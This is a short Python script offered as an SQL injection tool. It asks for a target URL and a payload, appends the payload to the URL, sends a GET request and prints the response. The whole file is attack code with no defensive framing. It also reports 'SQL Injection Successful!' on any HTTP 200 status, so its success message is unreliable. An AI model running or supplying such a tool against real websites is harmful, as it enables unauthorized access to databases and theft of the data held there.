import requests

def perform_sql_injection(url, payload):
    try:
        response = requests.get(url + payload)
        if response.status_code == 200:
            print("SQL Injection Successful!")
            print("Response:")
            print(response.text)
        else:
            print("Failed to perform SQL Injection.")
    except Exception as e:
        print("Error:", e)

if __name__ == "__main__":
    target_url = input("Enter the URL vulnerable to SQL injection: ")
    sql_payload = input("Enter the SQL injection payload: ")
    perform_sql_injection(target_url, sql_payload)
